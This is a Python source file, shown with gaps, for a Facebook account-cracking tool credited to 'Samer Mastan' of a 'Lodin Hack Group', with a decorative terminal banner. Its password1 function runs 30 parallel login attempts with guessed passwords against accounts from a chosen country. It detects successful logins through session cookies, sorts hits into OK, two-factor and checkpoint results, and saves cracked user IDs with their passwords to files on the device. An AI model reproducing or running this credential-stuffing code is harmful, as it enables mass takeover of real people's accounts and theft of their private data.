...
\033[1;90m   _|_|_|    _|_|    _|      _|  _|_|_|_|  _|_|_|        _|      _|    _|_|      _|_|_|  _|_|_|_|_|    _|_|    _|      _|  
\033[1;90m _|        _|    _|  _|_|  _|_|  _|        _|    _|      _|_|  _|_|  _|    _|  _|            _|      _|    _|  _|_|    _|  
\033[1;90m   _|_|    _|_|_|_|  _|  _|  _|  _|_|_|    _|_|_|        _|  _|  _|  _|_|_|_|    _|_|        _|      _|_|_|_|  _|  _|  _|  
\033[1;90m       _|  _|    _|  _|      _|  _|        _|    _|      _|      _|  _|    _|        _|      _|      _|    _|  _|    _|_|  
\033[1;90m _|_|_|    _|    _|  _|      _|  _|_|_|_|  _|    _|      _|      _|  _|    _|  _|_|_|        _|      _|    _|  _|      _|  
                                        
                                                                                                                                                                                                                                                                                                                                                 
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m 𝐒𝐀𝐌𝐄𝐑 𝐌𝐀𝐒𝐓𝐀𝐍                 \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m 𝐋𝐎𝐃𝐈𝐍 𝐇𝐀𝐂𝐊 𝐆𝐑𝐎𝐔𝐏          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m 𝐋𝐎𝐃𝐈𝐍 𝐇𝐀𝐂𝐊       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m𝟕𝟑𝟖𝟑𝟖𝟐𝟐𝟖𝟐𝟗𝟐          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m𝟏,𝟖𝟎                       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m 𝐋𝐎𝐃𝐈𝐍 𝐓𝐄𝐀𝐂𝐇          \033[1;31m│
\033[1;37m╚🅑︎🅗︎🅣︎PRAY FOR ME ANYTIME [𝐌𝐑 𝐒𝐀𝐌𝐄𝐑 𝐌𝐀𝐒𝐓𝐀𝐍]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mSAMER-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mSAMER-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : MR SAMER")
    print("\t  Fb page  : MR SAMER")
    ...
    try:
        ...
        print("\t Welcome To MR SAMER- MAFYIA 313 Tool ....")
        time.sleep(2)
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}AFGHANISTAN⚡")
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio SAMER_OK.mp3")
                print('\r\033[1;32m[SAMER-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/SAMER-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio SAMER_2F.mp3")
                    print('\r\033[1;34m[SAMER-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/SAMER-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio SAMER_CP.mp3")
                    print(f'\r\033[1;30m[SAMER-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/SAMER-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SAMER MASTAN😈] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio SAMER-OK.mp3")
                print('\r\033[1;32m[SAMER-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/SAMER-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
